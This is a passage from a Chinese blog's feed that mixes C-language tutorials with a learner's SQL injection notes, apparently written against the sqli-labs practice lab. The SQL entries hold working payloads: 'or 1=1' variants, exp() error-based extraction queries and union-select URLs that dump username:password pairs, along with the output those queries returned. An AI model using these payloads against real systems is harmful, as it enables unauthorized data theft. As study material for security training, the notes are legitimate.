d>h</td><td>68%</td><td>,</td><td>%B4</td><td>Ý</td><td>%DD</td><td></td></tr><tr><td>$</td><td>24%</td><td>I</td><td>49%</td><td>i</td><td>69%</td><td>µ</td><td>%B5</td><td>Þ</td><td>%DE</td><td></td></tr><tr><td>%</td><td>25%</td><td>J</td><td>%4A</td><td>j</td><td>%6A</td><td>»</td><td>%BB</td><td>ß</td><td>%DF</td><td></td></tr><tr><td>&amp;</td><td>26%</td><td>K</td><td>%4B</td><td>k</td><td>%6B</td><td>¼</td><td>%BC</td><td>à</td><td>%E0</td><td></td></tr><tr><td>‘</td><td>27%</td><td>L</td><td>%4C</td><td>l</td><td>%6C</td><td>½</td><td>%BD</td><td>á</td><td>%E1</td><td></td></tr><tr><td>(</td><td>28%</td><td>M</td><td>%4D</td><td>m</td><td>%6D</td><td>¿</td><td>%BF</td><td>â</td><td>%E2</td><td></td></tr><tr><td>)</td><td>29%</td><td>N</td><td>%4E</td><td>n</td><td>%6E</td><td>À</td><td>%C0</td><td>ã</td><td>%E3</td><td></td></tr><tr><td>*</td><td>%2A</td><td>O</td><td>%4F</td><td>o</td><td>%6F</td><td>Á</td><td>%C1</td><td>ä</td><td>%E4</td><td></td></tr><tr><td>+</td><td>%2B</td><td>P</td><td>50%</td><td>p</td><td>70%</td><td>Â</td><td>%C2</td><td>å</td><td>%E5</td><td></td></tr><tr><td>,</td><td>%2C</td><td>Q</td><td>51%</td><td>q</td><td>71%</td><td>Ã</td><td>%C3</td><td>æ</td><td>%E6</td><td></td></tr><tr><td>-</td><td>%2D</td><td>R</td><td>52%</td><td>r</td><td>72%</td><td>Ä</td><td>%C4</td><td>ç</td><td>%E7</td><td></td></tr><tr><td>.</td><td>%2E</td><td>S</td><td>53%</td><td>s</td><td>73%</td><td>Å</td><td>%C5</td><td>è</td><td>%E8</td><td></td></tr><tr><td>/</td><td>%2F</td><td>T</td><td>54%</td><td>t</td><td>74%</td><td>Æ</td><td>%C6</td><td>é</td><td>%E9</td><td></td></tr><tr><td>0</td><td>30%</td><td>U</td><td>55%</td><td>u</td><td>75%</td><td>Ç</td><td>%C7</td><td>ê</td><td>%EA</td><td></td></tr><tr><td>1</td><td>31%</td><td>V</td><td>56%</td><td>v</td><td>76%</td><td>È</td><td>%C8</td><td>ë</td><td>%EB</td><td></td></tr><tr><td>2</td><td>32%</td><td>W</td><td>57%</td><td>w</td><td>77%</td><td>É</td><td>%C9</td><td>ì</td><td>%EC</td><td></td></tr><tr><td>3</td><td>33%</td><td>X</td><td>58%</td><td>x</td><td>78%</td><td>Ê</td><td>%CA</td><td>í</td><td>%ED</td><td></td></tr><tr><td>4</td><td>34%</td><td>Y</td><td>59%</td><td>y</td><td>79%</td><td>Ë</td><td>%CB</td><td>î</td><td>%EE</td><td></td></tr><tr><td>5</td><td>35%</td><td>Z</td><td>%5A</td><td>z</td><td>%7A</td><td>Ì</td><td>%CC</td><td>ï</td><td>%EF</td><td></td></tr><tr><td>6</td><td>36%</td><td></td><td></td><td></td><td></td><td></td><td></td><td>ð</td><td>%F0</td><td></td></tr><tr><td>7</td><td>37%</td><td>?</td><td>%3F</td><td>{</td><td>%7B</td><td>Í</td><td>%CD</td><td>ñ</td><td>%F1</td><td></td></tr><tr><td>8</td><td>38%</td><td>@</td><td>40%</td><td>|</td><td>%7C</td><td>Î</td><td>%CE</td><td>ò</td><td>%F2</td><td></td></tr><tr><td>9</td><td>39%</td><td>[</td><td>%5B</td><td>}</td><td>%7D</td><td>Ï</td><td>%CF</td><td>ó</td><td>%F3</td><td></td></tr><tr><td>:</td><td>%3A</td><td>\</td><td>%5C</td><td>~</td><td>%7E</td><td>Ð</td><td>%D0</td><td>ô</td><td>%F4</td><td></td></tr><tr><td>;</td><td>%3B</td><td>]</td><td>%5D</td><td>¢</td><td>%A2</td><td>Ñ</td><td>%D1</td><td>õ</td><td>%F5</td><td></td></tr><tr><td>&lt;</td><td>%3C</td><td>^</td><td>%5E</td><td>£</td><td>%A3</td><td>Ò</td><td>%D2</td><td>ö</td><td>%F6</td><td></td></tr><tr><td>=</td><td>%3D</td><td>_</td><td>%5F</td><td>¥</td><td>%A5</td><td>Ó</td><td>%D3</td><td>÷</td><td>%F7</td><td></td></tr><tr><td>&gt;</td><td>%3E</td><td>`</td><td>60%</td><td>|</td><td>%A6</td><td>Ô</td><td>%D4</td><td>ø</td><td>%F8</td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>ù</td><td>%F9</td><td></td></tr></tbody></table>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQl：函数（更新）</title>
      <link href="2020/12/02/sql-han-shu-geng-xin/"/>
      <url>2020/12/02/sql-han-shu-geng-xin/</url>
      
        <content type="html"><![CDATA[<h1 id="常用函数："><a href="#常用函数：" class="headerlink" title="常用函数："></a>常用函数：</h1><p>addslashes()：less-33</p><p>ascii()：将某个字符转换 为 ascii 值<br>concat(str1,str2,…)–：没有分隔符的连接字符串</p><p>concat_ws(separator,str1,str2,…)–：含有分隔符的连接字符串</p><p>count(*) 函数返回表中的记录数</p><p>database()：显示数据库名称</p><p>extractvalue() :对XML文档进行查询的函数（见extractvalue）</p><p>floor()：把输出的结果取整</p><p>group by语句：把结果分组输出</p><p>group_concat(str1,str2,…)：连接一个组的所有字符串，并以逗号分隔每一条数据</p><p>left(a,b)：从左侧截取 a 的前 b 位</p><p>length():判断长度</p><p>mid(a,b,c)：从位置 b 开始，截取 a 字符串的 c 位</p><p>mysql_real_escape_string()函数：less-36</p><p>preg_replace()：见less23</p><p>rand()：随机输出一个小于1的正数</p><p>substr(a,b,c)：从 b 位置开始，截取字符串 a 的 c 长度（从1开始排序）</p><p>updatexml()：函数与extractvalue()类似，是更新xml文档的函数。（见updatexml）</p><p>user()：数据库用户名<br>version()：mysql版本<br>@@datadir–：数据库路径<br>@@version_compile_os–：操作系统版本</p><h1 id="一般用于尝试的语句："><a href="#一般用于尝试的语句：" class="headerlink" title="一般用于尝试的语句："></a>一般用于尝试的语句：</h1><p>Ps:–+可以用#替换，url 提交过程中 Url 编码后的#为%23<br>or 1=1–+<br> ‘or 1=1–+<br> “or 1=1–+<br>)or 1=1–+<br> ‘)or 1=1–+<br> “) or 1=1–+<br>“))or 1=1–+</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL：使用exp进行SQL报错注入</title>
      <link href="2020/12/02/sql-shi-yong-exp-jin-xing-sql-bao-cuo-zhu-ru/"/>
      <url>2020/12/02/sql-shi-yong-exp-jin-xing-sql-bao-cuo-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h1 id="一、注入数据："><a href="#一、注入数据：" class="headerlink" title="一、注入数据："></a>一、注入数据：</h1><p>当涉及到注入时，我们使用否定查询来造成“<code>DOUBLE value is out of range</code>”的错误。作者之前的博文提到的，将0按位取反就会返回“<code>18446744073709551615</code>”，再加上函数成功执行后返回0的缘故，我们将成功执行的函数取反就会得到最大的无符号<code>BIGINT</code>值。</p><pre><code>mysql&gt; select ~0;+----------------------+| ~0                   |+----------------------+| 18446744073709551615 |+----------------------+1 row in set (0.00 sec) mysql&gt; select ~(select version());+----------------------+| ~(select version())  |+----------------------+| 18446744073709551610 |+----------------------+1 row in set, 1 warning (0.00 sec)</code></pre><p>我们通过子查询与按位求反，造成一个<code>DOUBLE overflow error</code>，并借由此注出数据。</p><pre><code>&gt;`exp(~(select*from(select user())x))`    mysql&gt; select exp(~(select*from(select user())x));    ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))'</code></pre><h1 id="二、注出数据："><a href="#二、注出数据：" class="headerlink" title="二、注出数据："></a>二、注出数据：</h1><p>得到表名：</p><pre><code>select exp(~(select*from(select table_name from information_schema.tables where table_schema=database() limit 0,1)x));</code></pre><p>得到列名：</p><pre><code>select exp(~(select*from(select column_name from information_schema.columns where table_name='users' limit 0,1)x));</code></pre><p>检索数据：</p><pre><code>select exp(~ (select*from(select concat_ws(':',id, username, password) from users limit 0,1)x));</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL:sqlilabs less-1-4:union注入</title>
      <link href="2020/11/26/sql-sqlilabs-less-1-4-union-zhu-ru/"/>
      <url>2020/11/26/sql-sqlilabs-less-1-4-union-zhu-ru/</url>
      
        <content type="html"><![CDATA[<p>爆数据的顺序就是①schema_name ②table_name ③column_name④把username连同password用group_concat函数连接</p><p>+————————————————————————————————————————————–+</p><p>①?id=-1’union select 1,group_concat(username,0x3a,password),3 from users–+</p><p>②?id=-1 union select 1,group_concat(username,0x3a,password),3 from users–+</p><p>③?id=-1’) union select 1,group_concat(username,0x3a,password),3 from users–+</p><p>④?id=-1”) union select 1,group_concat(username,0x3a,password),3 from users–+</p><p>总之就是“?id=”后不报错的语句加上语句“union select 1,group_concat(username,0x3a,password),3 from users–+”</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>C语言：变量的生存期和存储类型</title>
      <link href="2020/11/26/c-yu-yan-bian-liang-de-sheng-cun-qi-he-cun-chu-lei-xing/"/>
      <url>2020/11/26/c-yu-yan-bian-liang-de-sheng-cun-qi-he-cun-chu-lei-xing/</url>
      
        <content type="html"><![CDATA[<p>一、变量的生存期</p><p>C程序占用的存储空间可以分为程序区、静态存储区、动态存储区3个部分</p><p>程序区用于存放程序；静态存储区是在程序开始执行时就分配的固定存储单元，如全局变量；动态存储区是在函数调用过程中进行分配的存储单元，如函数形参、自动变量、函数调用时的现场保护和返回地址等。</p><p>存放在静态存储区的变量，其生存期从程序运行开始一直到程序运行结束；存放在动态存储区和寄存器的变量，其生存期从变量定义开始到函数运行结束为止。定义时可以使用auto，static，register，extern等关键字来说明变量的存储类型。</p><p>二、局部变量的存储类型</p><p>(1)自动变量</p><p>auto，存放于动态存储区，函数执行结束，占用的存储空间立即释放，作用域是其所在的函数。</p><p>(2)静态变量</p><p>static，运行期间占用存储空间不释放，下次再调用函数时，变量的值就是该函数上次调用后的值，定义静态变量时不赋初值，编译系统自动赋值（数值变量0，字符变量空字符）。</p><p>(3)寄存器变量</p><p>register，访问寄存器中的变量比访问内存快，生存周期与自动变量相同，寄存器变量只能是字符型变量，整形变量和指针类型的变量。</p><p>三、全局变量的储存类型</p><p>(4)外部变量</p><p>extern，外部变量是定义在函数外的全局变量，存放在静态存储区中，其生存期存在于程序的整个运行过程；作用域从定义开始至程序末尾；</p><p>(5)静态全局变量</p><p>static，静态全局变量的作用域限制在定义该变量的源文件内，其他源文件不能使用它。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL：联合注入</title>
      <link href="2020/11/24/sql-lian-he-zhu-ru/"/>
      <url>2020/11/24/sql-lian-he-zhu-ru/</url>
      
        <content type="html"><![CDATA[<p>操作是这样：</p><p>?id=-1’union select 1,group_concat(schema_name),3 from information_schema.schemata–+<br>Your Login name:information_schema,challenges,mysql,performance_schema,security,test<br>Your Password:3</p><p>?id=-1’union select 1, 2, group_concat(schema_name) from information_schema.schemata–+<br>Your Login name:2<br>Your Password:information_schema,challenges,mysql,performance_schema,security,test</p><p>?id=-1’union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’security’–+<br>Your Login name:emails,referers,uagents,users<br>Your Password:3</p><p>?id=-1’union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’users’–+<br>Your Login name:id,username,password<br>Your Password:3</p><p>?id=99’union select 1,group_concat(concat_ws(‘:’,username,password)),3 from security.users–+<br>Your Login name:Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,supefrman:genious,batman:mob!le,admin:admin,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4<br>Your Password:3</p><p>结果是这样：</p><p>![]J5EF4ELJ<del>C[9C70[$X]4Y8](D:\blog\source_posts\SQL第一关]J5EF4ELJ</del>C[9C70[$X]4Y8.png)</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL：在SQL server的注入</title>
      <link href="2020/11/24/sql-zai-sql-server-de-zhu-ru/"/>
      <url>2020/11/24/sql-zai-sql-server-de-zhu-ru/</url>
      
        <content type="html"><![CDATA[<p>一、测试SQL注入的存在：</p><p>测试步骤如下：</p><p>1.数字型注入</p><p>①HTTP://<a href="http://www.xxser.com/test.php?id=8'">www.xxser.com/test.php?id=8'</a></p><p>SQL语句为: select * from table where id=8’，这样的语句肯定会出错，导致脚本程序无法从数据库中正常获取数据，从而使原来的页面出现异常。</p><p>②HTTP://<a href="http://www.xxser.com/test.php?id=8">www.xxser.com/test.php?id=8</a> and 1=1</p><p>SQL语句为select * from table where id=8 and 1=1,语句执行正常，返回数据与原始请求无任何差异。</p><p>③HTTP://<a href="http://www.xxser.com/test.php?id=8">www.xxser.com/test.php?id=8</a> and 1=2</p><p>SQL语句变为 select * from table where id=8 and 1=2 ,语句执行正常，但却无法查询出数据，因为“ and 1=2 ”始终为假。所以返回数据与原始请求有差异。</p><p>如果以上三个步骤全部满足，则程序就可能存在SQL注入漏洞。</p><p>强类型语言在这方面比弱类型语言有优势。</p><p>2.字符型注入</p><p>当输入参数为字符串时，称为字符型。数字型与字符型注入最大的区别在于:数字类型不需要单引号闭合，而字符串类型般要使用单引号来闭合。</p><p>字符型注入最关键的是如何闭合SQL语句以及注释多余的代码。</p><p>当查询内容为字符串时，SQL代码如下:</p><p>select * from  table where username =’admin’</p><p>当攻击者进行SQL注入时，如果输入“admin and 1=1”，则无法进行注入。因为“admin and1=1”会被数据库当作查询的字符串，SQL语句如下:</p><p>select * from table where username =’admin and 1=1’</p><p>这时想要进行注入，则必须注意字符串闭合问题。如果输入”admin’ and1=1–“就可以继续注入，SQL语句如下:</p><p>select ★from table where username =’admin’ and 1=1 –’</p><p>只要是字符串类型注入，都必须闭合单引号以及注释多余的代码。例如，update 语句: update Person set username =’username ‘,set password= ‘password’ where id=1</p><p>现在对该SQL语句进行注入，就需要闭合单引号，可以在username或password处插入语 句为“’+(select @@version)+’”，最终执行的SQL语句为:</p><p>update person set username=’username’ , set password=’ ‘+ (select@@version)+ ‘ ‘ where id=1 </p><p>利用两次单引号闭合才完成SQL注入。</p><p>二、order by 语句判断数据表列数，例如：</p><p>order by 3不报错，order by 4 报错 ，则数据表有三列</p><p>注：常用表视图：</p><p>![76A13B7656A8D4B40651E87F62988610](D:\blog\source_posts\SQL注入-1(SQL server)\76A13B7656A8D4B40651E87F62988610.png)</p><p>三：UNION查询：</p><p>联合查询敏感信息</p><p>如果得知列数为4，可以使用以下语句继续注入：</p><p>id=5 union select ‘x’,null,null,null from sysobject where xtype=’U’</p><p>如果第一列数据类型不匹配，数据库将会报错，这时可以继续递归查询，知道语句正常执行为止。</p><p>id=5 union select null,’x’,null,null from sysobject where xtype=’U’</p><p>id=5 union select null,null,’x’,null from sysobject where xtype=’U’</p><p>语句执行正常，代表数据类型兼容，就可以将x替换为SQL语句，查询敏感信息。</p><p>四、使用系统函数：</p><p>select suser_name():返回用户的登录标识名；</p><p>select user_name():基于指定的标识号返回数据库用户名；</p><p>select db_name():返回数据库名称；</p><p>select is_member(‘db_owner’):是否为数据库角色；</p><p>select convert(int,’5’):数据类型转换。</p><p>注：SQL server常用函数：</p><p>![E6530B94DE1FE160A7E73BE22883E2C2](D:\blog\source_posts\SQL注入-1(SQL server)\E6530B94DE1FE160A7E73BE22883E2C2.png)</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>C语言：四舍五入两种方法</title>
      <link href="2020/11/22/c-yu-yan-si-she-wu-ru-liang-chong-fang-fa/"/>
      <url>2020/11/22/c-yu-yan-si-she-wu-ru-liang-chong-fang-fa/</url>
      
        <content type="html"><![CDATA[<p>a的第n位四舍五入</p><p>一、</p><p>a = (int)(pow(10,n) * a + 0.5) / pow(10,n);</p><p>以1.23456为例</p><p>a = (int）(1000.0 * a + 0.5) / 1000.0；<br>即可。如果要保留四位小数，就把1000都换成10000，依次类推。</p><p>二、</p><p>其实，用C语言中的printf控制好精度后，要输出几位小数，然后输出可以自动进行四舍五入，不需要人工舍入了（若不是要利用舍入后的结果参与运算，而是单纯地想控制输出格式的时候）。<br>下面的代码可以简单验证：</p><p>#include&lt;stdio.h&gt;</p><p> int main() </p><p>{ </p><p>float a=2.1234567;</p><p> float b=3.016237; </p><p>printf(“%.4f\n”,a);    <em>//输出：2.1235，自动进行了四舍五入。</em>  </p><p>printf(“%.2f\n”,b);    <em>//输出：3.02，自动进行了四舍五入。</em> </p><p> printf(“%.3f\n”,b);    <em>//输出：3.016，自动进行了四舍五入。</em></p><p>  return 0;</p><p> }</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>C语言：宏定义</title>
      <link href="2020/11/17/c-yu-yan-hong-ding-yi/"/>
      <url>2020/11/17/c-yu-yan-hong-ding-yi/</url>
      
        <content type="html"><![CDATA[<p>5.6.1  无参宏定义</p><p>无参宏定义即定义一个没有参数的宏。</p><p>#define 标识符 字符串</p><p>5.6.2  带参宏定义</p><p>在宏定义中的参数称为形式参数，在调用带参宏时给出的参数称为实际参数</p><p>#define 宏名(形参表) 字符串</p><p>在使用带参宏定义时，应注意以下问题：</p><p>1.在带参宏定义中，宏名与其后的左括号之间不应加空格,否则将变成无参宏定义</p><p>2.在带参宏定义中，一般应将字符串及字符串中的形参用圆括号括起来</p><p>带参宏定义与函数的主要区别如下：</p><p>1.函数调用时，先求出实参表达式的值，然后代入形参。而使用带参数的宏只是进行简单的字符替换。</p><p>2.函数调用是在程序运行时处理的。为形参分配临时的内在单元。而宏展开则是在编译前进行的，在展开时并不分配内存单元，不进行值的传递处理，也没有“返回值”的概念。</p><p>3.对函数中的实参和形参都要定义类型，二者的关型要求一致。如不一致，应进行类型转换。而宏不存在类型问题，安名无类型， 它的参数也无类型，只是一个符号代表，展开时代入指定的字符串即可。宏定义时，字符串可以是任何类型的数据。</p><p>4.调用函数只可得到一个返回值，而用宏可以设法得到几个结果。</p><p>5.宏替换不占运行时间，只占编译时间。而函数调用则占运行时间。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>C语言：函数数据类型</title>
      <link href="2020/11/06/c-yu-yan-han-shu-shu-ju-lei-xing/"/>
      <url>2020/11/06/c-yu-yan-han-shu-shu-ju-lei-xing/</url>
      
        <content type="html"><![CDATA[<h1 id="C-数据类型"><a href="#C-数据类型" class="headerlink" title="C 数据类型"></a>C 数据类型</h1><p>在 C 语言中，数据类型指的是用于声明不同类型的变量或函数的一个广泛的系统。变量的类型决定了变量存储占用的空间，以及如何解释存储的位模式。</p><p>C 中的类型可分为以下几种：</p><table><thead><tr><th align="left">序号</th><th align="left">类型与描述</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><strong>基本类型：</strong> 它们是算术类型，包括两种类型：整数类型和浮点类型。</td></tr><tr><td align="left">2</td><td align="left"><strong>枚举类型：</strong> 它们也是算术类型，被用来定义在程序中只能赋予其一定的离散整数值的变量。</td></tr><tr><td align="left">3</td><td align="left"><strong>void 类型：</strong> 类型说明符 <em>void</em> 表明没有可用的值。</td></tr><tr><td align="left">4</td><td align="left"><strong>派生类型：</strong> 它们包括：指针类型、数组类型、结构类型、共用体类型和函数类型。</td></tr></tbody></table><p>数组类型和结构类型统称为聚合类型。函数的类型指的是函数返回值的类型。在本章节接下来的部分我们将介绍基本类型，其他几种类型会在后边几个章节中进行讲解。</p><h2 id="整数类型"><a href="#整数类型" class="headerlink" title="整数类型"></a>整数类型</h2><p>下表列出了关于标准整数类型的存储大小和值范围的细节：</p><table><thead><tr><th align="left">类型</th><th align="left">存储大小</th><th align="left">值范围</th></tr></thead><tbody><tr><td align="left">char</td><td align="left">1 字节</td><td align="left">-128 到 127 或 0 到 255</td></tr><tr><td align="left">unsigned char</td><td align="left">1 字节</td><td align="left">0 到 255</td></tr><tr><td align="left">signed char</td><td align="left">1 字节</td><td align="left">-128 到 127</td></tr><tr><td align="left">int</td><td align="left">2 或 4 字节</td><td align="left">-32,768 到 32,767 或 -2,147,483,648 到 2,147,483,647</td></tr><tr><td align="left">unsigned int</td><td align="left">2 或 4 字节</td><td align="left">0 到 65,535 或 0 到 4,294,967,295</td></tr><tr><td align="left">short</td><td align="left">2 字节</td><td align="left">-32,768 到 32,767</td></tr><tr><td align="left">unsigned short</td><td align="left">2 字节</td><td align="left">0 到 65,535</td></tr><tr><td align="left">long</td><td align="left">4 字节</td><td align="left">-2,147,483,648 到 2,147,483,647</td></tr><tr><td align="left">unsigned long</td><td align="left">4 字节</td><td align="left">0 到 4,294,967,295</td></tr></tbody></table><blockquote><p>注意，各种类型的存储大小与系统位数有关，但目前通用的以64位系统为主。</p></blockquote><p>为了得到某个类型或某个变量在特定平台上的准确大小，您可以使用 <strong>sizeof</strong> 运算符。表达式 <em>sizeof(type)</em> 得到对象或类型的存储字节大小。下面的实例演示了获取 int 类型的大小：</p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>#include &lt;stdio.h&gt; #include &lt;limits.h&gt;  int main() {   printf(“int 存储大小 : %lu \n”, sizeof(int));      return 0; }</p><p><strong>%lu</strong> 为 32 位无符号整数，详细说明查看 <a href="https://www.runoob.com/cprogramming/c-function-printf.html">C 库函数 - printf()</a>。</p><p>当您在 Linux 上编译并执行上面的程序时，它会产生下列结果：</p><pre><code>int 存储大小 : 4 </code></pre><h2 id="浮点类型"><a href="#浮点类型" class="headerlink" title="浮点类型"></a>浮点类型</h2><p>下表列出了关于标准浮点类型的存储大小、值范围和精度的细节：</p><table><thead><tr><th align="left">类型</th><th align="left">存储大小</th><th align="left">值范围</th><th align="left">精度</th></tr></thead><tbody><tr><td align="left">float</td><td align="left">4 字节</td><td align="left">1.2E-38 到 3.4E+38</td><td align="left">6 位小数</td></tr><tr><td align="left">double</td><td align="left">8 字节</td><td align="left">2.3E-308 到 1.7E+308</td><td align="left">15 位小数</td></tr><tr><td align="left">long double</td><td align="left">16 字节</td><td align="left">3.4E-4932 到 1.1E+4932</td><td align="left">19 位小数</td></tr></tbody></table><p>头文件 float.h 定义了宏，在程序中可以使用这些值和其他有关实数二进制表示的细节。下面的实例将输出浮点类型占用的存储空间以及它的范围值：</p><h2 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h2><p>#include &lt;stdio.h&gt; #include &lt;float.h&gt;  int main() {   printf(“float 存储最大字节数 : %lu \n”, sizeof(float));   printf(“float 最小值: %E\n”, FLT_MIN );   printf(“float 最大值: %E\n”, FLT_MAX );   printf(“精度值: %d\n”, FLT_DIG );      return 0; }</p><p><strong>%E</strong> 为以指数形式输出单、双精度实数，详细说明查看 <a href="https://www.runoob.com/cprogramming/c-function-printf.html">C 库函数 - printf()</a>。</p><p>当您在 Linux 上编译并执行上面的程序时，它会产生下列结果：</p><pre><code>float 存储最大字节数 : 4 float 最小值: 1.175494E-38float 最大值: 3.402823E+38精度值: 6</code></pre><h2 id="void-类型"><a href="#void-类型" class="headerlink" title="void 类型"></a>void 类型</h2><p>void 类型指定没有可用的值。它通常用于以下三种情况下：</p><table><thead><tr><th align="left">序号</th><th align="left">类型与描述</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><strong>函数返回为空</strong> C 中有各种函数都不返回值，或者您可以说它们返回空。不返回值的函数的返回类型为空。例如 <strong>void exit (int status);</strong></td></tr><tr><td align="left">2</td><td align="left"><strong>函数参数为空</strong> C 中有各种函数不接受任何参数。不带参数的函数可以接受一个 void。例如 <strong>int rand(void);</strong></td></tr><tr><td align="left">3</td><td align="left"><strong>指针指向 void</strong> 类型为 void * 的指针代表对象的地址，而不是类型。例如，内存分配函数 <strong>void *malloc( size_t size );</strong> 返回指向 void 的指针，可以转换为任何数据类型。</td></tr></tbody></table><p>如果现在您还是无法完全理解 void 类型，不用太担心，在后续的章节中我们将会详细讲解这些概念。</p><p> <a href="https://www.runoob.com/cprogramming/c-basic-syntax.html">C 基本语法</a></p><p><a href="https://www.runoob.com/cprogramming/c-variables.html">C 变量</a> </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>C语言：程序的控制结构</title>
      <link href="2020/11/05/c-yu-yan-cheng-xu-de-kong-zhi-jie-gou/"/>
      <url>2020/11/05/c-yu-yan-cheng-xu-de-kong-zhi-jie-gou/</url>
      
        <content type="html"><![CDATA[<h1 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h1><p>有的时候，我们可能需要多次执行同一块代码。一般情况下，语句是按顺序执行的：函数中的第一个语句先执行，接着是第二个语句，依此类推。</p><p>编程语言提供了更为复杂执行路径的多种控制结构。</p><p>循环语句允许我们多次执行一个语句或语句组，下面是大多数编程语言中循环语句的流程图：</p><h2 id="循环类型"><a href="#循环类型" class="headerlink" title="循环类型"></a>循环类型</h2><p>C 语言提供了以下几种循环类型。点击链接查看每个类型的细节。</p><table><thead><tr><th align="left">循环类型</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><a href="https://www.runoob.com/cprogramming/c-while-loop.html">while 循环</a></td><td align="left">当给定条件为真时，重复语句或语句组。它会在执行循环主体之前测试条件。</td></tr><tr><td align="left"><a href="https://www.runoob.com/cprogramming/c-for-loop.html">for 循环</a></td><td align="left">多次执行一个语句序列，简化管理循环变量的代码。</td></tr><tr><td align="left"><a href="https://www.runoob.com/cprogramming/c-do-while-loop.html">do…while 循环</a></td><td align="left">除了它是在循环主体结尾测试条件外，其他与 while 语句类似。</td></tr><tr><td align="left"><a href="https://www.runoob.com/cprogramming/c-nested-loops.html">嵌套循环</a></td><td align="left">您可以在 while、for 或 do..while 循环内使用一个或多个循环。</td></tr></tbody></table><h2 id="循环控制语句"><a href="#循环控制语句" class="headerlink" title="循环控制语句"></a>循环控制语句</h2><p>循环控制语句改变你代码的执行顺序。通过它你可以实现代码的跳转。</p><p>C 提供了下列的循环控制语句。点击链接查看每个语句的细节。</p><table><thead><tr><th align="left">控制语句</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><a href="https://www.runoob.com/cprogramming/c-break-statement.html">break 语句</a></td><td align="left">终止<strong>循环</strong>或 <strong>switch</strong> 语句，程序流将继续执行紧接着循环或 switch 的下一条语句。</td></tr><tr><td align="left"><a href="https://www.runoob.com/cprogramming/c-continue-statement.html">continue 语句</a></td><td align="left">告诉一个循环体立刻停止本次循环迭代，重新开始下次循环迭代。</td></tr><tr><td align="left"><a href="https://www.runoob.com/cprogramming/c-goto-statement.html">goto 语句</a></td><td align="left">将控制转移到被标记的语句。但是不建议在程序中使用 goto 语句。</td></tr></tbody></table><h2 id="无限循环"><a href="#无限循环" class="headerlink" title="无限循环"></a>无限循环</h2><p>如果条件永远不为假，则循环将变成无限循环。<strong>for</strong> 循环在传统意义上可用于实现无限循环。由于构成循环的三个表达式中任何一个都不是必需的，您可以将某些条件表达式留空来构成一个无限循环。</p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>#include &lt;stdio.h&gt;  int main () {   for( ; ; )   {      printf(“该循环会永远执行下去！\n”);   }   return 0; }</p><p>当条件表达式不存在时，它被假设为真。您也可以设置一个初始值和增量表达式，但是一般情况下，C 程序员偏向于使用 for(;;) 结构来表示一个无限循环。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>C语言：运算符和结合性</title>
      <link href="2020/11/05/c-yu-yan-yun-suan-fu-he-jie-he-xing/"/>
      <url>2020/11/05/c-yu-yan-yun-suan-fu-he-jie-he-xing/</url>
      
        <content type="html"><![CDATA[<p>一、（自左向右）</p><p>[ ]数组下标</p><p>（ ）圆括号</p><p>.  成员选择</p><p>-&gt;  成员选择</p><p>二、（自左向右，单目）</p><p>－负号运算符</p><p>（类型）强制类型转换</p><p>++自增运算符</p><p>－－自减运算符</p><p>*指针运算符</p><p>&amp;取地址运算符</p><p>！逻辑非运算符</p><p>~按位取反运算符</p><p>sizeof 长度运算符</p><p>三、（自左向右  双目）</p><p>*乘法运算符</p><p>/除法运算符</p><p>%求余运算符</p><p>四、自左向右 双目</p><p>+－ 加减运算符</p><p>五、自左向右 双目</p><p>《》左右移运算符</p><p>六、自左向右 双目</p><p>a&gt;  ,&gt;=,&lt;,&lt;=关系运算符</p><p>七、自左向右双目</p><p>== ！=</p><p>八、自左向右 双目</p><p>&amp; 按位与</p><p>九自左向右 双目</p><p>^ 按位异或</p><p>十自左向右 双目</p><p>|按位或</p><p>十一、自左向右 双目</p><p>&amp;&amp; 逻辑与</p><p>十二、自左向右 双目</p><p>||逻辑或</p><p>十三、自右向左 三目</p><p>？：条件运算符</p><p>十四自右向左 双目</p><p>赋值运算符</p><p>十五、自左向右</p><p>， 逗号运算符</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>C语言：字符串处理函数</title>
      <link href="2020/11/05/c-yu-yan-zi-fu-chuan-chu-li-han-shu/"/>
      <url>2020/11/05/c-yu-yan-zi-fu-chuan-chu-li-han-shu/</url>
      
